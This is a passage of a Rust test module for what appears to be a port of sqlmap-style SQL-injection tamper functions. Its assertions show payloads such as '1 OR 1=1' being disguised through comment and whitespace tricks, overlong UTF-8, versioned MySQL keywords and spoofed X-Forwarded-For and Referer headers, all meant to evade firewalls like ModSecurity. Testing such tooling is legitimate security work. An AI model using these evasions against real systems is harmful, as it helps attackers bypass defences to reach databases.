        assert_eq!(apostrophenullencode("a'b"), "a%00%27b");
        assert_eq!(sp_password("1 OR 1=1"), "1 OR 1=1sp_password");
        let h = space2morehash("1 AND 1=1", &mut rng);
        assert!(h.starts_with("1%23") && h.contains("%0AAND") && !h.contains(' '));
        let d = space2dash("1 AND 1=1", &mut rng);
        assert!(d.starts_with("1--") && d.contains("%0AAND") && !d.contains(' '));
        assert_eq!(base64encode("1 AND 1=1"), "MSBBTkQgMT0x");
        assert_eq!(base64encode("AB"), "QUI=");
        assert_eq!(base64encode("A"), "QQ==");
    }

    #[test]
    fn batch_30_to_42() {
        assert_eq!(htmlencode("a'b"), "a&#x27;b");
        assert_eq!(bluecoat("1 AND 1=1"), "1%09AND%091 LIKE 1");
        assert_eq!(commalesslimit("x LIMIT 2,3"), "x LIMIT 3 OFFSET 2");
        assert_eq!(commalesslimit("LIMIT 5"), "LIMIT 5");
        assert_eq!(concat2concatws("CONCAT(a,b)"), "CONCAT_WS(MID(CHAR(0),0,0),a,b)");
        assert_eq!(
            ifnull2casewhenisnull("IFNULL(a,b)"),
            "CASE WHEN ISNULL(a) THEN (b) ELSE (a) END"
        );
        assert_eq!(
            ifnull2casewhenisnull("IFNULL(CAST(x AS INT),0)"),
            "CASE WHEN ISNULL(CAST(x AS INT)) THEN (0) ELSE (CAST(x AS INT)) END"
        );
        assert_eq!(modsecurityversioned("p"), "/*!30000p*/");
        assert_eq!(modsecurityzeroversioned("p"), "/*!00000p*/");
        assert_eq!(unmagicquotes("a'b"), "a%bf%27b-- ");
        assert_eq!(overlongutf8more("a'<>"), "a%C0%A7%C0%BC%C0%BE");
        assert_eq!(versionedkeywords("aNd x"), "/*!AND*/ x");
        assert_eq!(
            informationschemacomment("FROM information_schema.tables"),
            "FROM INFORMATION_SCHEMA/**/.tables"
        );
        assert_eq!(charunicodeencode("a'b"), "a%u0027b");
    }

    #[test]
    fn header_tampers_mutate_headers_not_payload() {
        let names = vec!["xforwardedfor".to_string(), "varnish".to_string()];
        let h = header_mutations(&names, 1);
        assert_eq!(h.len(), 2);
        assert_eq!(h[0].0, "X-Forwarded-For");
        assert!(h[0].1.split('.').count() == 4, "{}", h[0].1);
        assert_eq!(h[1], ("X-Forwarded-For".to_string(), "127.0.0.1".to_string()));
        // The payload chain passes header tampers through unchanged.
        assert_eq!(
            apply_all(&names, "1 AND 1=1", 7).unwrap(),
            "1 AND 1=1"
        );
    }

    #[test]
    fn batch_42_to_45() {
        assert_eq!(commalessmid("MID(abc,1,2)"), "MID(abc FROM 1 FOR 2)");
        assert_eq!(commalessmid("MID(a,(1+1),2)"), "MID(a FROM (1+1) FOR 2)");
        assert_eq!(commalessmid("no mid here"), "no mid here");
        assert_eq!(hex2char("x=0x4142"), "x=CHAR(0x41,0x42)");
        assert_eq!(hex2char("0x41"), "CHAR(0x41)");
        // odd digit counts and identifier-adjacent tokens are left alone
        assert_eq!(hex2char("a0x41"), "a0x41");
        assert_eq!(hex2char("0x4"), "0x4");
        assert_eq!(hexentities("a'b"), "&#x61;&#x27;&#x62;");
    }

    #[test]
    fn referer_embeds_payload_in_header() {
        let names = vec!["referer".to_string()];
        assert_eq!(
            payload_header_mutations(&names, "1 AND 1=1"),
            vec![("Referer".to_string(), "1 AND 1=1".to_string())]
        );
        // And it leaves the payload itself untouched.
        assert_eq!(apply_all(&names, "1 AND 1=1", 7).unwrap(), "1 AND 1=1");
    }
}
